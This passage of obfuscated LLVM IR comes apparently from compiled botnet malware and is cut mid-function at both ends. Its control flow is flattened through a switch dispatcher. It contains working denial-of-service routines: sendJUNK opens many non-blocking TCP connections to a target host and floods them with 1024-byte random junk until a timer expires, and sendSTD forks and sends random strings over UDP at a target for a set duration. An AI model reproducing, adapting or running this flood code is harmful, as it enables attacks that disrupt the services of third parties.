  %222 = getelementptr inbounds %struct.state_t, %struct.state_t* %221, i32 0, i32 0
  %223 = load i32, i32* %222, align 8
  %224 = srem i32 %223, 64
  %225 = zext i32 %224 to i64
  %226 = shl i64 1, %225
  %227 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %228 = load i32, i32* %8, align 4
  %229 = sext i32 %228 to i64
  %.reload10 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %230 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload10, i64 %229
  %231 = getelementptr inbounds %struct.state_t, %struct.state_t* %230, i32 0, i32 0
  %232 = load i32, i32* %231, align 8
  %233 = sdiv i32 %232, 64
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds [16 x i64], [16 x i64]* %227, i64 0, i64 %234
  %236 = load i64, i64* %235, align 8
  %237 = or i64 %236, %226
  store i64 %237, i64* %235, align 8
  %238 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %238, align 8
  %239 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %239, align 8
  %240 = load i32, i32* %8, align 4
  %241 = sext i32 %240 to i64
  %.reload9 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %242 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload9, i64 %241
  %243 = getelementptr inbounds %struct.state_t, %struct.state_t* %242, i32 0, i32 0
  %244 = load i32, i32* %243, align 8
  %245 = add nsw i32 %244, 1
  %246 = call i32 @select(i32 %245, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.timeval* %12)
  store i32 %246, i32* %15, align 4
  %247 = load i32, i32* %15, align 4
  %248 = icmp ne i32 %247, 0
  %249 = select i1 %248, i32 1667601983, i32 -158823895
  store i32 %249, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = load i32, i32* %8, align 4
  %252 = sext i32 %251 to i64
  %.reload8 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %253 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload8, i64 %252
  %254 = getelementptr inbounds %struct.state_t, %struct.state_t* %253, i32 0, i32 0
  %255 = load i32, i32* %254, align 8
  %256 = call i32 @close(i32 %255)
  %257 = load i32, i32* %8, align 4
  %258 = sext i32 %257 to i64
  %.reload7 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %259 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload7, i64 %258
  %260 = getelementptr inbounds %struct.state_t, %struct.state_t* %259, i32 0, i32 1
  store i8 0, i8* %260, align 4
  store i32 -158823895, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  store i32 865433680, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 865433680, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  store i32 -505544949, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i32, i32* %8, align 4
  %265 = add nsw i32 %264, 1
  store i32 %265, i32* %8, align 4
  store i32 -268876393, i32* %switchVar
  br label %loopEnd

; <label>:266:                                    ; preds = %loopEntry
  store i32 686523776, i32* %switchVar
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  %268 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %268)
  store i32 -1003185617, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %267, %266, %263, %262, %NewDefault, %261, %250, %218, %217, %208, %207, %206, %205, %194, %190, %189, %184, %173, %162, %130, %129, %120, %119, %118, %113, %106, %101, %73, %LeafBlock, %LeafBlock1, %NodeBlock, %NodeBlock3, %62, %57, %56, %51, %35, %34, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare i32 @time(...) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) #0 {
  %.reg2mem27 = alloca i32
  %.reg2mem6 = alloca %struct.state_t*
  %.reg2mem = alloca i32
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %20 = call i32 @getdtablesize() #2
  %21 = sdiv i32 %20, 2
  store i32 %21, i32* %7, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %22, align 4
  %23 = load i32, i32* %5, align 4
  %24 = trunc i32 %23 to i16
  %25 = call zeroext i16 @htons(i16 zeroext %24) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = load i8*, i8** %4, align 8
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %29 = call i32 @getHost(i8* %27, %struct.in_addr* %28)
  store i32 %29, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 640235193, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar5 = load i32, i32* %switchVar
  switch i32 %switchVar5, label %switchDefault [
    i32 640235193, label %first
    i32 151420235, label %32
    i32 -1160711615, label %33
    i32 1079018104, label %49
    i32 -165192192, label %54
    i32 1249864187, label %55
    i32 1769614759, label %60
    i32 629108542, label %NodeBlock3
    i32 -1332924561, label %NodeBlock
    i32 488861066, label %LeafBlock1
    i32 -1139096903, label %LeafBlock
    i32 1765966481, label %71
    i32 -1413918107, label %99
    i32 -1951168363, label %104
    i32 103150256, label %111
    i32 1792424027, label %116
    i32 -210213403, label %117
    i32 2043473875, label %118
    i32 -1490587769, label %127
    i32 819659879, label %128
    i32 2114935134, label %160
    i32 838309011, label %171
    i32 936698454, label %182
    i32 -1071118475, label %187
    i32 -996857598, label %188
    i32 228746546, label %192
    i32 -550430491, label %203
    i32 -1885918806, label %204
    i32 982087920, label %205
    i32 328775710, label %216
    i32 -1011280523, label %221
    i32 -332906926, label %232
    i32 2139555031, label %NewDefault
    i32 -610351550, label %233
    i32 -397704561, label %234
    i32 -129357572, label %237
    i32 673175552, label %238
    i32 -2075754161, label %240
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %30 = icmp ne i32 %.reload, 0
  %31 = select i1 %30, i32 151420235, i32 -1160711615
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 -2075754161, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %35 = getelementptr inbounds [8 x i8], [8 x i8]* %34, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %35, i8 0, i64 8, i32 4, i1 false)
  %36 = load i32, i32* %7, align 4
  %37 = zext i32 %36 to i64
  %38 = call i8* @llvm.stacksave()
  store i8* %38, i8** %10, align 8
  %39 = alloca %struct.state_t, i64 %37, align 16
  store %struct.state_t* %39, %struct.state_t** %.reg2mem6
  %.reload26 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %40 = bitcast %struct.state_t* %.reload26 to i8*
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = mul i64 %42, 5
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 %43, i32 16, i1 false)
  %44 = call noalias i8* @malloc(i64 1024) #2
  store i8* %44, i8** %16, align 8
  %45 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %45, i8 0, i64 1024, i32 1, i1 false)
  %46 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %47 = load i32, i32* %6, align 4
  %48 = add nsw i32 %46, %47
  store i32 %48, i32* %17, align 4
  store i32 1079018104, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %17, align 4
  %51 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %52 = icmp sgt i32 %50, %51
  %53 = select i1 %52, i32 -165192192, i32 673175552
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  store i32 0, i32* %8, align 4
  store i32 1249864187, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* %8, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp slt i32 %56, %57
  %59 = select i1 %58, i32 1769614759, i32 -129357572
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %8, align 4
  %62 = sext i32 %61 to i64
  %.reload25 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %63 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload25, i64 %62
  %64 = getelementptr inbounds %struct.state_t, %struct.state_t* %63, i32 0, i32 1
  %65 = load i8, i8* %64, align 4
  %66 = zext i8 %65 to i32
  store i32 %66, i32* %.reg2mem27
  store i32 629108542, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload31 = load volatile i32, i32* %.reg2mem27
  %Pivot4 = icmp slt i32 %.reload31, 1
  %67 = select i1 %Pivot4, i32 -1139096903, i32 -1332924561
  store i32 %67, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload29 = load volatile i32, i32* %.reg2mem27
  %Pivot = icmp slt i32 %.reload29, 2
  %68 = select i1 %Pivot, i32 -210213403, i32 488861066
  store i32 %68, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload28 = load volatile i32, i32* %.reg2mem27
  %SwitchLeaf2 = icmp eq i32 %.reload28, 2
  %69 = select i1 %SwitchLeaf2, i32 982087920, i32 2139555031
  store i32 %69, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload30 = load volatile i32, i32* %.reg2mem27
  %SwitchLeaf = icmp eq i32 %.reload30, 0
  %70 = select i1 %SwitchLeaf, i32 1765966481, i32 2139555031
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %73 = load i32, i32* %8, align 4
  %74 = sext i32 %73 to i64
  %.reload24 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %75 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload24, i64 %74
  %76 = getelementptr inbounds %struct.state_t, %struct.state_t* %75, i32 0, i32 0
  store i32 %72, i32* %76, align 8
  %77 = load i32, i32* %8, align 4
  %78 = sext i32 %77 to i64
  %.reload23 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %79 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload23, i64 %78
  %80 = getelementptr inbounds %struct.state_t, %struct.state_t* %79, i32 0, i32 0
  %81 = load i32, i32* %80, align 8
  %82 = load i32, i32* %8, align 4
  %83 = sext i32 %82 to i64
  %.reload22 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %84 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload22, i64 %83
  %85 = getelementptr inbounds %struct.state_t, %struct.state_t* %84, i32 0, i32 0
  %86 = load i32, i32* %85, align 8
  %87 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 3, i8* null)
  %88 = or i32 %87, 2048
  %89 = call i32 (i32, i32, ...) @fcntl(i32 %81, i32 4, i32 %88)
  %90 = load i32, i32* %8, align 4
  %91 = sext i32 %90 to i64
  %.reload21 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %92 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload21, i64 %91
  %93 = getelementptr inbounds %struct.state_t, %struct.state_t* %92, i32 0, i32 0
  %94 = load i32, i32* %93, align 8
  %95 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %96 = call i32 @connect(i32 %94, %struct.sockaddr* %95, i32 16)
  %97 = icmp ne i32 %96, -1
  %98 = select i1 %97, i32 -1951168363, i32 -1413918107
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = call i32* @__errno_location() #13
  %101 = load i32, i32* %100, align 4
  %102 = icmp ne i32 %101, 115
  %103 = select i1 %102, i32 -1951168363, i32 103150256
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i32, i32* %8, align 4
  %106 = sext i32 %105 to i64
  %.reload20 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %107 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload20, i64 %106
  %108 = getelementptr inbounds %struct.state_t, %struct.state_t* %107, i32 0, i32 0
  %109 = load i32, i32* %108, align 8
  %110 = call i32 @close(i32 %109)
  store i32 1792424027, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %8, align 4
  %113 = sext i32 %112 to i64
  %.reload19 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %114 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload19, i64 %113
  %115 = getelementptr inbounds %struct.state_t, %struct.state_t* %114, i32 0, i32 1
  store i8 1, i8* %115, align 4
  store i32 1792424027, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  store i32 -610351550, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  store i32 2043473875, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %120 = getelementptr inbounds [16 x i64], [16 x i64]* %119, i64 0, i64 0
  %121 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %120) #2, !srcloc !6
  %122 = extractvalue { i64, i64* } %121, 0
  %123 = extractvalue { i64, i64* } %121, 1
  %124 = trunc i64 %122 to i32
  store i32 %124, i32* %18, align 4
  %125 = ptrtoint i64* %123 to i64
  %126 = trunc i64 %125 to i32
  store i32 %126, i32* %19, align 4
  store i32 -1490587769, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  store i32 819659879, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = load i32, i32* %8, align 4
  %130 = sext i32 %129 to i64
  %.reload18 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %131 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload18, i64 %130
  %132 = getelementptr inbounds %struct.state_t, %struct.state_t* %131, i32 0, i32 0
  %133 = load i32, i32* %132, align 8
  %134 = srem i32 %133, 64
  %135 = zext i32 %134 to i64
  %136 = shl i64 1, %135
  %137 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %138 = load i32, i32* %8, align 4
  %139 = sext i32 %138 to i64
  %.reload17 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %140 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload17, i64 %139
  %141 = getelementptr inbounds %struct.state_t, %struct.state_t* %140, i32 0, i32 0
  %142 = load i32, i32* %141, align 8
  %143 = sdiv i32 %142, 64
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds [16 x i64], [16 x i64]* %137, i64 0, i64 %144
  %146 = load i64, i64* %145, align 8
  %147 = or i64 %146, %136
  store i64 %147, i64* %145, align 8
  %148 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %148, align 8
  %149 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %149, align 8
  %150 = load i32, i32* %8, align 4
  %151 = sext i32 %150 to i64
  %.reload16 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %152 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload16, i64 %151
  %153 = getelementptr inbounds %struct.state_t, %struct.state_t* %152, i32 0, i32 0
  %154 = load i32, i32* %153, align 8
  %155 = add nsw i32 %154, 1
  %156 = call i32 @select(i32 %155, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %156, i32* %15, align 4
  %157 = load i32, i32* %15, align 4
  %158 = icmp eq i32 %157, 1
  %159 = select i1 %158, i32 2114935134, i32 -996857598
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %161 = load i32, i32* %8, align 4
  %162 = sext i32 %161 to i64
  %.reload15 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %163 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload15, i64 %162
  %164 = getelementptr inbounds %struct.state_t, %struct.state_t* %163, i32 0, i32 0
  %165 = load i32, i32* %164, align 8
  %166 = bitcast i32* %14 to i8*
  %167 = call i32 @getsockopt(i32 %165, i32 1, i32 4, i8* %166, i32* %13) #2
  %168 = load i32, i32* %14, align 4
  %169 = icmp ne i32 %168, 0
  %170 = select i1 %169, i32 838309011, i32 936698454
  store i32 %170, i32* %switchVar
  br label %loopEnd

; <label>:171:                                    ; preds = %loopEntry
  %172 = load i32, i32* %8, align 4
  %173 = sext i32 %172 to i64
  %.reload14 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %174 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload14, i64 %173
  %175 = getelementptr inbounds %struct.state_t, %struct.state_t* %174, i32 0, i32 0
  %176 = load i32, i32* %175, align 8
  %177 = call i32 @close(i32 %176)
  %178 = load i32, i32* %8, align 4
  %179 = sext i32 %178 to i64
  %.reload13 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %180 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload13, i64 %179
  %181 = getelementptr inbounds %struct.state_t, %struct.state_t* %180, i32 0, i32 1
  store i8 0, i8* %181, align 4
  store i32 -1071118475, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load i32, i32* %8, align 4
  %184 = sext i32 %183 to i64
  %.reload12 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %185 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload12, i64 %184
  %186 = getelementptr inbounds %struct.state_t, %struct.state_t* %185, i32 0, i32 1
  store i8 2, i8* %186, align 4
  store i32 -1071118475, i32* %switchVar
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  store i32 -1885918806, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i32, i32* %15, align 4
  %190 = icmp eq i32 %189, -1
  %191 = select i1 %190, i32 228746546, i32 -550430491
  store i32 %191, i32* %switchVar
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  %193 = load i32, i32* %8, align 4
  %194 = sext i32 %193 to i64
  %.reload11 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %195 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload11, i64 %194
  %196 = getelementptr inbounds %struct.state_t, %struct.state_t* %195, i32 0, i32 0
  %197 = load i32, i32* %196, align 8
  %198 = call i32 @close(i32 %197)
  %199 = load i32, i32* %8, align 4
  %200 = sext i32 %199 to i64
  %.reload10 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %201 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload10, i64 %200
  %202 = getelementptr inbounds %struct.state_t, %struct.state_t* %201, i32 0, i32 1
  store i8 0, i8* %202, align 4
  store i32 -550430491, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  store i32 -1885918806, i32* %switchVar
  br label %loopEnd

; <label>:204:                                    ; preds = %loopEntry
  store i32 -610351550, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  %206 = load i8*, i8** %16, align 8
  call void @makeRandomStr(i8* %206, i32 1024)
  %207 = load i32, i32* %8, align 4
  %208 = sext i32 %207 to i64
  %.reload9 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %209 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload9, i64 %208
  %210 = getelementptr inbounds %struct.state_t, %struct.state_t* %209, i32 0, i32 0
  %211 = load i32, i32* %210, align 8
  %212 = load i8*, i8** %16, align 8
  %213 = call i64 @send(i32 %211, i8* %212, i64 1024, i32 16384)
  %214 = icmp eq i64 %213, -1
  %215 = select i1 %214, i32 328775710, i32 -332906926
  store i32 %215, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  %217 = call i32* @__errno_location() #13
  %218 = load i32, i32* %217, align 4
  %219 = icmp ne i32 %218, 11
  %220 = select i1 %219, i32 -1011280523, i32 -332906926
  store i32 %220, i32* %switchVar
  br label %loopEnd

; <label>:221:                                    ; preds = %loopEntry
  %222 = load i32, i32* %8, align 4
  %223 = sext i32 %222 to i64
  %.reload8 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %224 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload8, i64 %223
  %225 = getelementptr inbounds %struct.state_t, %struct.state_t* %224, i32 0, i32 0
  %226 = load i32, i32* %225, align 8
  %227 = call i32 @close(i32 %226)
  %228 = load i32, i32* %8, align 4
  %229 = sext i32 %228 to i64
  %.reload7 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %230 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload7, i64 %229
  %231 = getelementptr inbounds %struct.state_t, %struct.state_t* %230, i32 0, i32 1
  store i8 0, i8* %231, align 4
  store i32 -332906926, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  store i32 -610351550, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -610351550, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  store i32 -397704561, i32* %switchVar
  br label %loopEnd

; <label>:234:                                    ; preds = %loopEntry
  %235 = load i32, i32* %8, align 4
  %236 = add nsw i32 %235, 1
  store i32 %236, i32* %8, align 4
  store i32 1249864187, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  store i32 1079018104, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %239 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %239)
  store i32 -2075754161, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %238, %237, %234, %233, %NewDefault, %232, %221, %216, %205, %204, %203, %192, %188, %187, %182, %171, %160, %128, %127, %118, %117, %116, %111, %104, %99, %71, %LeafBlock, %LeafBlock1, %NodeBlock, %NodeBlock3, %60, %55, %54, %49, %33, %32, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %.reg2mem = alloca i32
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.hostent*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca [36 x i8*], align 16
  %15 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %16 = call i32 @fork() #2
  store i32 %16, i32* %8, align 4
  %17 = load i32, i32* %8, align 4
  store i32 %17, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -959173820, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -959173820, label %first
    i32 1309734772, label %20
    i32 2125372075, label %24
    i32 1006214813, label %25
    i32 -600298753, label %51
    i32 -141123854, label %61
    i32 -1391075280, label %78
    i32 295383333, label %81
    i32 -633022340, label %82
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %18 = icmp sgt i32 %.reload, 0
  %19 = select i1 %18, i32 2125372075, i32 1309734772
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %8, align 4
  %22 = icmp slt i32 %21, 1
  %23 = select i1 %22, i32 2125372075, i32 1006214813
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  ret void

; <label>:25:                                     ; preds = %loopEntry
  %26 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %26, i32* %7, align 4
  %27 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %28 = sext i32 %27 to i64
  store i64 %28, i64* %9, align 8
  %29 = load i8*, i8** %4, align 8
  %30 = call %struct.hostent* @gethostbyname(i8* %29)
  store %struct.hostent* %30, %struct.hostent** %11, align 8
  %31 = bitcast %struct.sockaddr_in* %10 to i8*
  call void @llvm.memset.p0i8.i64(i8* %31, i8 0, i64 16, i32 4, i1 false)
  %32 = load %struct.hostent*, %struct.hostent** %11, align 8
  %33 = getelementptr inbounds %struct.hostent, %struct.hostent* %32, i32 0, i32 4
  %34 = load i8**, i8*** %33, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 0
  %36 = load i8*, i8** %35, align 8
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %38 = bitcast %struct.in_addr* %37 to i8*
  %39 = load %struct.hostent*, %struct.hostent** %11, align 8
  %40 = getelementptr inbounds %struct.hostent, %struct.hostent* %39, i32 0, i32 3
  %41 = load i32, i32* %40, align 4
  %42 = sext i32 %41 to i64
  call void @bcopy(i8* %36, i8* %38, i64 %42) #2
  %43 = load %struct.hostent*, %struct.hostent** %11, align 8
  %44 = getelementptr inbounds %struct.hostent, %struct.hostent* %43, i32 0, i32 2
  %45 = load i32, i32* %44, align 8
  %46 = trunc i32 %45 to i16
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 %46, i16* %47, align 4
  %48 = load i32, i32* %5, align 4
  %49 = trunc i32 %48 to i16
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %49, i16* %50, align 2
  store i32 0, i32* %12, align 4
  store i32 450, i32* %13, align 4
  store i32 -600298753, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = bitcast [36 x i8*]* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %52, i8* bitcast ([36 x i8*]* @sendSTD.randstrings to i8*), i64 288, i32 16, i1 false)
  %53 = call i32 @rand() #2
  %54 = sext i32 %53 to i64
  %55 = urem i64 %54, 36
  %56 = getelementptr inbounds [36 x i8*], [36 x i8*]* %14, i64 0, i64 %55
  %57 = load i8*, i8** %56, align 8
  store i8* %57, i8** %15, align 8
  %58 = load i32, i32* %12, align 4
  %59 = icmp uge i32 %58, 50
  %60 = select i1 %59, i32 -141123854, i32 -633022340
  store i32 %60, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %7, align 4
  %63 = load i8*, i8** %15, align 8
  %64 = load i32, i32* %13, align 4
  %65 = sext i32 %64 to i64
  %66 = call i64 @send(i32 %62, i8* %63, i64 %65, i32 0)
  %67 = load i32, i32* %7, align 4
  %68 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %69 = call i32 @connect(i32 %67, %struct.sockaddr* %68, i32 16)
  %70 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %71 = sext i32 %70 to i64
  %72 = load i64, i64* %9, align 8
  %73 = load i32, i32* %6, align 4
  %74 = sext i32 %73 to i64
  %75 = add nsw i64 %72, %74
  %76 = icmp sge i64 %71, %75
  %77 = select i1 %76, i32 -1391075280, i32 295383333
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %7, align 4
  %80 = call i32 @close(i32 %79)
  call void @_exit(i32 0) #12
  unreachable

; <label>:81:                                     ; preds = %loopEntry
  store i32 0, i32* %12, align 4
  store i32 -633022340, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
